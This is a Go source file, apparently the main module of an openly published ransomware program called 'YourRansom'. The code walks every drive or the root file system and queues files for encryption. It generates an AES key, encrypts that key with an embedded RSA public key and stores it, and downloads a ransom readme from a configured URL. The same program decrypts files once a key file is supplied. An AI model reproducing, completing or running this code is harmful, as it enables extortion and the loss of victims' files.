//    YourRansom
//    Copyright (C) 2017 boboliu

//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.

//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.

//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strings"
	"strconv"
)

var method byte
var settings = Config{}

func do_cAll(path string, list chan string) error {

	if filter(path) == 0 {
		return nil
	}

	dir, err := os.Stat(path)
	if err != nil {
		return err
	}

	if !dir.IsDir() {
		if method == 'e' && filter(path) == 2 {
			return nil
		}
		list <- path
		return nil
	}

	fd, err := os.Open(path)
	if err != nil {
		return err
	}

	names, err1 := fd.Readdirnames(1000)
	if len(names) == 0 || err1 != nil {
		return nil
	}

	names = reList(names, 3)
	for _, name := range names {
		do_cAll(path+string(os.PathSeparator)+name, list)
	}
	return nil
}

func cAll(list chan string) {

	defer func() {
		if method == 'e' {
			downloadReadme()
		}
	}()

	if runtime.GOOS != "windows" {
		do_cAll("/", list)
	} else {
		DriverChan := make(chan bool, 26)
		for i := 0; i < 26; i++ {
			go func(path string, list chan string, ExitChan chan bool) {
				do_cAll(path, list)
				ExitChan <- true
			}(string('A'+i)+":\\", list, DriverChan)
		}
		for i := 0; i < 26; i++ {
			<-DriverChan
		}
	}
	close(list)
	return
}

func getRand() []byte {
	b := make([]byte, 32)
	resp, err := http.Get("https://www.random.org/integers/?num=32&min=1&max=255&col=1&base=10&format=plain&rnd=new")
	if err != nil || resp.StatusCode != 200 {
		rand.Read(b)
		return b
	}

	body, err := ioutil.ReadAll(resp.Body)
	s := strings.Split(string(body), "\n")
	if len(s) != 32 {
		rand.Read(b)
		return b
	}
	for c, i := range s {
		tmp, err := strconv.Atoi(i)
		if err != nil {
			rand.Read(b)
			return b
		}
		b[c] = byte(tmp)
	}
	return b
}

func saveKey(cip []byte) {
	keyFile, _ := os.Create(settings.KeyFilename)
	pub := settings.pubKey
	word, _ := rsa.EncryptPKCS1v15(rand.Reader, &pub, cip)
	keyFile.WriteAt(word, 0)
	return
}

func downloadReadme() {
	res, err := http.Get(settings.ReadmeUrl)
	if err != nil {
		ioutil.WriteFile(settings.ReadmeFilename, []byte(settings.Readme), 0)
		return
	}
	defer res.Body.Close()
	data, _ := ioutil.ReadAll(res.Body)
	ioutil.WriteFile(settings.ReadmeNetFilename, data, 0)
	return
}

func main() {
	settings.init(configE)
	runtime.GOMAXPROCS(runtime.NumCPU())
	action := true
	handleList := make(chan string, 2048)
	bb, err := ioutil.ReadFile(settings.DkeyFilename)
	if err != nil {
		action = false
	}
	var cip cipher.Block
	if !action {
		b := getRand()
		cip, _ = aes.NewCipher(b)
		saveKey(b)
		for c := range b {
			b[c] = 0
		}
		method = 'e'
	} else {
		cip, _ = aes.NewCipher(bb)
		method = 'd'
	}
	go cAll(handleList)
	startHandler(cip, handleList)
}
